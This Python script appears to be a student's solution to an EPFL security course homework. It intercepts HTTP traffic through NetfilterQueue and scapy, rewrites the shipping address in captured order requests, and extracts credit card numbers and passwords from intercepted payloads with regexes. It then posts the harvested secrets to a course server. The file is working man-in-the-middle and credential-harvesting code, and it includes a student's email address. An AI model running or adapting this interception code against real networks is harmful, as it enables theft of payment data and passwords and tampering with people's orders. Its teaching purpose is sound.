from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import json
import re
import requests

DEBUG_VERBOSITY = 0
DEBUG_DEF_VERBO = 2

secrets = set()

def add_secret(s):
    n = len(secrets)
    secrets.add(s)
    if n < len(secrets):
        debug("{} secret(s) found: <{}>".format(len(secrets), s), 0)
        debug(list(secrets))
    if len(secrets) == 5:
        data_json_sensitive = {
            'student_email': 'gregoire.clement@epfl.ch', 
            'secrets': list(secrets),
        }
        r = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=data_json_sensitive)
        debug("Token for ex 04 found", 0)
        debug(r.content, 0)

def debug(s, level=DEBUG_DEF_VERBO):
    if level <= DEBUG_VERBOSITY:
        print(str(s))

def handler(pkt):
    ip = IP(pkt.get_payload())
    if ip.haslayer(TCP) and ip[TCP].dport == 80:
        if ip.haslayer(Raw):
            http = ip[Raw].load.decode()
            #http_header_parsed = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", http))
            try:
                json_data_str = re.findall(r'{[^)]+}', http)[0]
                debug(json_data_str)
                data_json_shipping = json.loads(json_data_str)
                data_json_shipping['shipping_address'] = 'gregoire.clement@epfl.ch'
                r = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", json=data_json_shipping)
                debug("Token for ex 03 found", 0)
                debug(r.content, 0)
            except IndexError:
                try:
                    raw_content = re.findall(r'"[^)]+"', http)[0]
                    if 'cc ---' in raw_content:
                        debug("hacking a credit card:")
                        try:
                            cc = re.findall(r'\b[0-9][0-9][0-9][0-9]\.[0-9][0-9][0-9][0-9]\.[0-9][0-9][0-9][0-9]\.[0-9][0-9][0-9][0-9]\b', raw_content)[0]
                            debug("SUCCESS=" + cc, 1)
                            add_secret(cc)
                        except IndexError:
                            try:
                                cc = re.findall(r'\b[0-9][0-9][0-9][0-9]\/[0-9][0-9][0-9][0-9]\/[0-9][0-9][0-9][0-9]\/[0-9][0-9][0-9][0-9]\b', raw_content)[0]
                                debug("SUCCESS=" + cc, 1)
                                add_secret(cc)
                            except IndexError:
                                debug("failed")
                                debug(raw_content)
                    elif 'pwd ---' in raw_content:
                        debug("hacking a password:")
                        try:
                            pwd = re.findall(r'pwd --- [A-Z0-9;:<>=?@]{8,30}', raw_content)[0][8:]
                            debug("SUCCESS=" + pwd, 1)
                            add_secret(pwd)
                        except IndexError:
                            debug("failed")
                            debug(raw_content)
                except IndexError:
                    debug("nothing here")

    pkt.accept()
        
nfqueue = NetfilterQueue()
nfqueue.bind(0, handler)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
